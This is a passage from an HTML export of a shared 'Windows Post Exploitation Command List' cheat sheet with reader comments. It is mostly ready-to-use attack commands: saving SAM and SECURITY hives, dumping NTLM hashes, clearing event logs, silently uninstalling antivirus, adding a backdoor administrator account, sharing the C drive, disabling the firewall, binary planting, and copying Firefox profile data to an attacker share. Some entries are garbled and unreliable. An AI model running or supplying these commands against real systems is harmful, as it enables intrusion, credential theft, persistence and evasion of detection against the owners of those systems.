name="a570823e4dff516ef2aeffaefd268baffcad2823"></a><a href="#" name="7"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c17"><p class="c1"><span>Comman</span><span>d</span></p></td><td class="c12"><p class="c1"><span>Description / Reason</span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>net share \\computername</span></p></td><td class="c12"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>tasklist /V /S computername</span></p></td><td class="c12"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>qwinsta /SERVER:computername</span></p></td><td class="c12"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>qprocess /SERVER:computername *</span></p></td><td class="c12"><p class="c1 c13"><span></span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>net use \\computername</span></p></td><td class="c12"><p class="c1"><span>This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed</span></p></td></tr><tr class="c5"><td class="c17"><p class="c1"><span>net use \\computername /user:DOMAIN\username password</span></p></td><td class="c12"><p class="c1"><span>Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</span></p><p class="c1 c13"><span></span></p><p class="c1"><span>This is useful when you&rsquo;ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.</span></p></td></tr><tr><td class="c17"><p class="c1"><span>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></p></td><td class="c12"><p class="c1"><span>Enable remote desktop.</span></p></td></tr><tr><td class="c17"><p class="c1"><span>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f</span></p><p class="c1 c13"><span></span></p></td><td class="c12"><p class="c1"><span>Enable remote assistance</span></p></td></tr></tbody></table><p class="c9 c13"><span></span></p><ol class="c19" start="1"><li class="c28"><span>net time \\computername (Shows the time of target computer)</span></li><li class="c28"><span>dir \\computername\share_or_admin_share\ &nbsp; (dir list a remote directory)</span></li><li class="c28"><span>tasklist /V /S computername</span></li></ol><ol class="c55" start="1"><li class="c35 c56"><span>Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount</span></li></ol><h2 class="c9"><a name="h.yz8d0rpmjxav"></a><span><br>Auto-Start Directories</span></h2><ol class="c19" start="1"><li class="c28"><span>ver (Returns kernel version - like uname on *nix)</span></li></ol><p class="c9 c13"><span></span></p><a href="#" name="135d79bee341ba6851c92bf16609c9db5e6a3ef9"></a><a href="#" name="8"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c58"><td class="c53"><p class="c1"><span>Windows NT 6.1, 6.0</span></p></td><td class="c33"><p class="c1"><span>%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\</span></p></td></tr><tr class="c5"><td class="c53"><p class="c1"><span>Windows NT 5.2, 5.1, 5,0</span></p></td><td class="c33"><p class="c1"><span>%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\</span></p></td></tr><tr class="c5"><td class="c53"><p class="c1"><span>Windows 9x</span></p></td><td class="c33"><p class="c1"><span>%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\</span></p></td></tr><tr class="c5"><td class="c53"><p class="c1"><span>Windows NT 4.0, 3.51, 3.50</span></p></td><td class="c33"><p class="c1"><span>%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\</span></p></td></tr></tbody></table><p class="c9 c13"><span></span></p><h2 class="c9"><a name="h.olmlns7ipvwp"></a><span>Binary Planting</span></h2><p class="c9 c13"><span></span></p><a href="#" name="834b82c53420b63e0c00c25ee0b16f18d8227f38"></a><a href="#" name="9"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr><td class="c29"><p class="c1"><span class="c20">Location / File name</span></p></td><td class="c29"><p class="c1"><span class="c20">Reason / Description</span></p></td></tr><tr><td class="c29"><p class="c1"><span>msiexec.exe</span></p></td><td class="c29"><p class="c18"><span>Idea taken from here: </span><span class="c3"><a class="c10" href="http://goo.gl/E3LTa">http://goo.gl/E3LTa</a></span><span>&nbsp;- basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying pah,t you get code execution.</span></p></td></tr><tr><td class="c29"><p class="c1"><span>%SystemRoot%\System32\wbem\mof\</span></p></td><td class="c29"><p class="c18"><span>Taken from stuxnet: </span><span class="c3"><a class="c10" href="http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf">http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf</a></span><span>&nbsp;Look for Print spooler vuln</span></p></td></tr></tbody></table><p class="c13 c35"><span></span></p><h2 class="c9"><a name="h.7h30potwraal"></a><span>WMI</span></h2><ol class="c19" start="1"><li class="c28"><span>wmic bios</span></li></ol><ol class="c19" start="1"><li class="c28"><span>wmic qfe</span><span>&nbsp;qfe get hotfixid</span></li></ol><ol class="c19" start="2"><li class="c28"><span>&nbsp; (This gets patches IDs)</span></li></ol><ol class="c19" start="2"><li class="c28 c31"><span>wmic startupwmic service</span></li><li class="c28"><span>wmic process get caption,executablepath,commandline</span></li><li class="c28"><span>wmic process call create &ldquo;process_name&rdquo; (executes a program)</span></li><li class="c28"><span>wmic process where name=&rdquo;process_name&rdquo; call terminate (terminates program)</span></li><li class="c28"><span>wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)</span></li><li class="c28"><span>wmic useraccount (usernames, sid, and various security related goodies)</span></li><li class="c28"><span>wmic useraccount get /ALL</span></li><li class="c28"><span>wmic share get /ALL (you can use ? for gets help ! )</span></li><li class="c28"><span>wmic startup list full (this can be a huge list!!!)</span></li><li class="c28"><span>wmic /node:&quot;hostname&quot; bios get serialnumber (this can be great for finding warranty info about target)</span></li></ol><h2 class="c9"><a name="h.7u33sdu4oulz"></a><span>Reg Command exit</span></h2><ol class="c19" start="1"><li class="c28 c31"><span>reg save HKLM\Security security.hive &nbsp;(Save security hive to a file)</span></li><li class="c28 c31"><span>reg save HKLM\System system.hive (Save system hive to a file)</span></li><li class="c28 c31"><span>reg save HKLM\SAM sam.hive (Save sam to a file)=</span></li></ol><ol class="c19" start="1"><li class="c28"><span>reg add [\\TargetIPaddr\] [RegDomain][ \Key ] </span></li><li class="c28"><span>reg export [RegDomain]\[Key] [FileName] </span></li><li class="c28"><span>reg import [FileName ]</span></li><li class="c28"><span>reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )</span></li></ol><h2 class="c9"><a name="h.95llvp1i0eel"></a><span>Deleting Logs</span></h2><ol class="c19" start="1"><li class="c28"><span>wevtutil el &nbsp;(list logs)</span></li><li class="c28"><span>wevtutil cl &lt;LogName&gt; (Clear specific lowbadming)</span></li><li class="c28"><span>del %WINDIR%\*.log /a /s /q /f</span></li></ol><p class="c1 c13"><span></span></p><h2 class="c9"><a name="h.89lj4wom3v17"></a><span>Uninstalling Software &ldquo;AntiVirus&rdquo; (Non interactive)</span></h2><ol class="c19" start="12"><li class="c28 c31"><span>wmic product get name /value (this gets software names)</span></li><li class="c28 c31"><span>wmic product where name=&quot;XXX&quot; call uninstall /nointeractive (this uninstalls software)</span></li></ol><p class="c1 c13"><span></span></p><h2 class="c9"><a name="h.n8l5wator02h"></a><span># Other &nbsp;(to be sorted)</span></h2><ol class="c19" start="14"><li class="c28 c31"><span>pkgmgr usefull &nbsp;/iu :&rdquo;Package&rdquo;</span></li><li class="c28 c31"><span>pkgmgr usefull &nbsp;/iu :&rdquo;TelnetServer&rdquo; (Install Telnet Service ...)</span></li><li class="c28 c31"><span>pkgmgr /iu:&rdquo;TelnetClient&rdquo; (Client )</span></li><li class="c28 c31"><span>rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)</span></li><li class="c28 c31"><span>wscript.exe &lt;script js/vbs&gt;</span></li><li class="c28 c31"><span>cscript.exe &lt;script js/vbs/c#&gt;</span></li><li class="c28"><span>xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff</span></li><li class="c28"><span>OS SPECIFIC</span><span>wmic</span><span>Win2k3</span></li></ol><ol class="c19" start="1"><li class="c28 c31"><span>winpop stat domainname</span></li></ol><p class="c1 c13"><span></span></p><h3 class="c9"><a name="h.anvlrk8jqsf5"></a><span>Vista/7</span></h3><ol class="c19" start="1"><li class="c28 c31"><span>winstat features</span></li><li class="c28 c31"><span>wbadmin get status</span></li><li class="c28 c31"><span>wbadmin get items</span></li><li class="c28 c31"><span>gpresult /H gpols.htm</span></li><li class="c28 c31"><span>bcdedit /export &lt;filename&gt;</span></li></ol><p class="c1 c13"><span></span></p><h3 class="c9"><a name="h.fpk0evmlh5z7"></a><span>Vista SP1/7/2008/2008R2 (x86 &amp; x64)</span></h3><p class="c1 c13"><span></span></p><p class="c9"><span class="c20">Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):</span></p><p class="c9"><span class="c20">*Note*</span><span>&nbsp;Works well after bypassuac + getsystem (requires system privileges)</span></p><p class="c1"><span>*</span><span class="c20">Note2</span><span>* For Dism.exe to work on x64 systems, the long commands are necessary</span></p><p class="c1 c13"><span></span></p><p class="c1"><span>To list features which can be enabled/disabled:</span></p><ol class="c19" start="1"><li class="c28"><span class="c26">%windir%\System32\cmd.exe /c &quot;%SystemRoot%\system32\Dism.exe&quot; /online /get-features</span></li></ol><p class="c9 c13"><span class="c26"></span></p><p class="c9"><span>To enable a feature (TFTP client for example):</span></p><ol class="c19" start="1"><li class="c28"><span class="c26">%windir%\System32\cmd.exe /c &quot;%SystemRoot%\system32\Dism.exe&quot; /online /enable-feature /featurename:TFTP</span></li></ol><p class="c9 c13"><span class="c26"></span></p><p class="c9"><span>To disable a feature (again TFTP client):</span></p><ol class="c19" start="1"><li class="c28"><span class="c26">%windir%\System32\cmd.exe /c &quot;%SystemRoot%\system32\Dism.exe&quot; /online /disable-feature /featurename:TFTP</span></li></ol><h2 class="c9 c16"><a name="h.xkz5gclfsvrj"></a><span>Invasive or Altering Commands</span></h2><p class="c1"><span>These commands change things on the target and can lead to getting detected</span><span class="c20"><br></span></p><a href="#" name="b68979aafe115e669bdb5b106632cac143090298"></a><a href="#" name="10"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c4"><p class="c1"><span class="c20">Command</span></p></td><td class="c32"><p class="c1"><span class="c20">Description</span></p></td></tr><tr class="c5"><td class="c4"><p class="c9"><span>net user hacker hacker /add</span></p></td><td class="c32"><p class="c1"><span>Creats a new local (to the victim) user called &lsquo;hacker&rsquo; with the password of &lsquo;hacker&rsquo;</span></p></td></tr><tr class="c5"><td class="c4"><p class="c9"><span>net localgroup administrators /add hacker</span></p><p class="c9"><span>or</span></p><p class="c9"><span>net localgroup administrators hacker /add</span></p></td><td class="c32"><p class="c1"><span>Adds the new user &lsquo;hacker&rsquo; to the local administrators group</span></p></td></tr><tr class="c5"><td class="c4"><p class="c1"><span>net share nothing$=C:\ /grant:hacker,FULL /unlimited</span></p></td><td class="c32"><p class="c1"><span>Shares the C drive (you can specify any drive) out as a Windows share and grants the user &lsquo;hacker&rsquo; full rights to access, or modify anything on that drive.</span></p><p class="c1 c13"><span></span></p><p class="c1"><span>One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn&rsquo;t a problem but it is something to keep in mind</span></p></td></tr><tr class="c5"><td class="c4"><p class="c1"><span>net user username /active:yes /domain</span></p></td><td class="c32"><p class="c1"><span>Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.</span></p></td></tr><tr class="c5"><td class="c4"><p class="c9"><span>netsh firewall set opmode disable</span></p></td><td class="c32"><p class="c1"><span>Disables the local windows firewall</span></p></td></tr><tr class="c5"><td class="c4"><p class="c1"><span>netsh firewall set opmode enable</span></p></td><td class="c32"><p class="c1"><span>Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.</span></p></td></tr></tbody></table><p class="c1 c13"><span></span></p><p class="c1 c13"><span></span></p><h2 class="c9"><a name="h.vec9dd91nzt"></a><span>Support Tools Binaries / Links / Usage</span></h2><p class="c1 c13"><span></span></p><a href="#" name="02780242ee1cf8ad4f953d836a07c989e31fa5b4"></a><a href="#" name="11"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c59"><p class="c1"><span class="c20">Command</span></p></td><td class="c43"><p class="c1"><span class="c20">Link to download</span></p></td><td class="c47"><p class="c1"><span class="c20">Description</span></p></td></tr><tr class="c5"><td class="c59"><p class="c1 c13"><span class="c20"></span></p></td><td class="c43"><p class="c1 c13"><span class="c20"></span></p></td><td class="c47"><p class="c1 c13"><span class="c20"></span></p></td></tr></tbody></table><p class="c18 c13"><span class="c20"></span></p><p class="c1 c13"><span class="c20"></span></p><h2 class="c9"><a name="h.ffa43r4w2v79"></a><span>Third Party Portable Tools</span></h2><p class="c1"><span>&nbsp;(must be contained in a single executable)</span></p><p class="c1 c13"><span></span></p><p class="c1"><span class="c25 c20">REMEMBER: DO NOT RUN BINARIES YOU HAVEN&rsquo;T VETTED - BINARIES BELOW ARE NOT BEING VOUCHED FOR IN ANY WAY AS THIS DOCUMENT CAN BE EDITED BY ANYONE</span></p><p class="c1 c13"><span class="c25 c20"></span></p><a href="#" name="c0fb250663d8ec2a8a170372e377803d7cb78129"></a><a href="#" name="12"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr class="c5"><td class="c30"><p class="c1"><span class="c20">Command</span></p></td><td class="c36"><p class="c1"><span class="c20">Link to download</span></p></td><td class="c22"><p class="c1"><span class="c20">Description</span></p></td></tr><tr class="c5"><td class="c30"><p class="c1"><span>carrot.exe /im /ie /ff /gc /wlan /vnc /ps /np /mp /dialup /pwdump</span></p></td><td class="c36"><p class="c18"><span class="c0"><a class="c10" href="http://h.ackack.net/carrot-exe.html">http://h.ackack.net/carrot-exe.html</a></span></p></td><td class="c22"><p class="c35"><span class="c25">-invasive- </span><span>Recovers a bunch passwordnetsh firewall set opmode disables.</span></p></td></tr><tr class="c5"><td class="c30"><p class="c1"><span>PwDump7.exe &gt; ntlm.txt</span></p></td><td class="c36"><p class="c18"><span class="c0"><a class="c10" href="http://www.tarasco.org/security/pwdump_7/">http://www.tarasco.org/security/pwdump_7/</a></span></p></td><td class="c22"><p class="c18"><span class="c25">-invasive- </span><span>Dumps Windows NTLM hashes. Holds the credentials for all accounts.</span></p></td></tr><tr class="c11"><td class="c30"><p class="c1 c13"><span></span></p><a href="#" name="ece3a202eabb333d9038dd24888941a4897702bb"></a><a href="#" name="13"></a><table cellpadding="0" cellspacing="0" class="c7"><tbody><tr><td class="c50"><h2 class="c9 c45"><a name="h.gmzob38fog8m"></a></h2></td><td class="c40"><p class="c1 c13"><span></span></p></td><td class="c50"><p class="c1 c13"><span></span></p></td></tr></tbody></table><p class="c18 c13"><span></span></p></td><td class="c36"><p class="c1 c13"><span></span></p><p class="c18"><span>http://www.nirsoft.net/utils/nircmd.html</span></p></td><td class="c22"><p class="c18"><span>A collection of small nifty features.</span></p></td></tr><tr class="c5"><td class="c30"><h2 class="c9 c16 c45"><a name="h.g3pxwwmglaom"></a></h2></td><td class="c27"><p class="c1 c13"><span></span></p></td><td class="c22"><p class="c18 c13"><span></span></p></td></tr><tr class="c5"><td class="c30"><p class="c1"><span>adfind.exe -b ou=ActiveDirectory,dc=example,dc=com -f &quot;objectClass=user&quot; sn givenName &nbsp;samaccountname -nodn -adcsv &gt; exported_users.csv</span></p><p class="c1 c13"><span></span></p></td><td class="c36"><p class="c18"><span class="c3"><a class="c10" href="http://www.joeware.net/freetools/">http://www.joeware.net/freetools/</a></span></p></td><td class="c22"><p class="c18"><span>Joeware tools have been used by admins for a while. This command will output the firstname, lastname and username of everyone in the AD domain example.com. Edit as needed.</span></p></td></tr><tr class="c5"><td class="c30"><p class="c1"><span>Various tools</span></p><p class="c1"><span>(e.g. \\hackarmoury.com\tools\all_binaries\fgdump.exe)</span></p></td><td class="c36"><p class="c18"><span>Some examples of protocols in use:</span></p><p class="c1"><span class="c0"><a class="c10" href="http://hackarmoury.com/tools">http://hackarmoury.com/tools</a></span></p><p class="c1"><span>\\hackarmoury.com\tools</span></p><p class="c1"><span class="c0"><a class="c10" href="ftp://hackarmoury.com">ftp://hackarmoury.com</a></span></p><p class="c1"><span class="c0">svn://hackarmoury.com</span></p><p class="c1"><span class="c0">svn://hackarmoury.com</span></p><p class="c1"><span class="c0"><a class="c10" href="http://ipv6.hackarmoury.com">http://ipv6.hackarmoury.com</a></span><span>&nbsp;(IPv6 ONLY)</span></p><p class="c1 c13"><span></span></p></td><td class="c22"><p class="c18"><span>HackArmoury.com is a site run by pentesters for pentesters, hosting a wide range of common tools accessible over many different protocols (e.g. Samba, HTTP[S], FTP, RSync, SVN, TFTP, IPv6 etc). The idea is you can access a common toolset from anywhere, without even needing to copy over the binaries to the host in the case of SMB.</span></p><p class="c1 c13"><span></span></p><p class="c1"><span>No registration or authentication required.</span></p></td></tr></tbody></table><p class="c1 c13"><span></span></p><p class="c1 c13"><span></span></p><p class="c13 c35"><span class="c20"></span></p><p class="c18 c13"><span></span></p><sup><a href="#cmnt1" name="cmnt_ref1">[a]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt2" name="cmnt_ref2">[b]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt3" name="cmnt_ref3">[c]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt4" name="cmnt_ref4">[d]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt5" name="cmnt_ref5">[e]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt6" name="cmnt_ref6">[f]</a></sup><p class="c18 c13"><span></span></p><sup><a href="#cmnt7" name="cmnt_ref7">[g]</a></sup><div><p class="c35 c66"><span class="c20 c26">Windows Post Exploitation Command List - Page: </span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref1" name="cmnt1">[a]</a><span>Anonymous:</span></p><p class="c18"><span>by the way thank you</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref2" name="cmnt2">[b]</a><span>Anonymous:</span></p><p class="c18"><span>mubix lock the document so people cant mess with it</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref3" name="cmnt3">[c]</a><span>hector j:</span></p><p class="c18"><span>this is good,this finished</span></p><hr><p class="c18"><span>Rob Fuller:</span></p><p class="c18"><span>No, I don&#39;t think this will be finished ever..</span></p><hr><p class="c18"><span>lynn0houston:</span></p><p class="c18"><span>why is this file in my google docs?</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref4" name="cmnt4">[d]</a><span>James Kearney:</span></p><p class="c18"><span>cheers dude</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref5" name="cmnt5">[e]</a><span>Romel Vera:</span></p><p class="c18"><span>Delete logs and traces please</span></p><hr><p class="c18"><span>lynn0houston:</span></p><p class="c18"><span>_Discussion marqu&eacute;e comme ferm&eacute;e_</span></p><hr><p class="c18"><span>lynn0houston:</span></p><p class="c18"><span>_Rouverte_</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref6" name="cmnt6">[f]</a><span>Anonymous:</span></p><p class="c18"><span>also i am copy pasting this into my new book called &quot;Post-Exploitation by Gregory D Evans&quot;</span></p></div><div class="c54"><p class="c18"><a href="#cmnt_ref7" name="cmnt7">[g]</a><span>Iago Sousa:</span></p><p class="c18"><span>great</span></p></div></body></html>